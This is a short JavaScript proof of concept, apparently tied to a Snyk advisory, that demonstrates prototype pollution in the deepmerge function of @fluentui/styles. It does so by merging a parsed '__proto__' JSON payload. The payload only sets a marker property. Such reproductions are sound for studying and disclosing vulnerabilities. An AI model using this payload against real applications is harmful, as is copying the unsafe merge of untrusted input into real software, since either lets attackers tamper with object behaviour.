//https://snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808

 
  const styles = require("@fluentui/styles");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  const source2 = {
    k3: {},
  };

   

  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
// End of file
